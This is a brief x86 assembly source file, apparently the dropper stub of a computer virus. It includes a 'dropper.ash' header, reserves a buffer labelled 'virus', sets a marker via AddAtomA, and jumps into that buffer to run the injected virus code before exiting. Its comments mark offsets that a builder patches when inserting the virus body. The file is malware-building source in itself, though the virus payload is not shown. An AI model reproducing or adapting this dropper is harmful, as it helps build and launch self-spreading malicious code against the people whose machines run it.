
include                 dropper.ash

callW                   macro   x
                        extrn   x:proc
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

virus:                  db      insvir_max dup (0)

                        .code
start:
                        push    'VVV'       ; <-- insdtype_ofs
                        push    esp         ;
                        callW   AddAtomA    ; fix insjmp_ofs/rva on change

                        call    virus       ; <-- insjmp_ofs/rva

                        push    -1
                        callW   ExitProcess

                        end     start
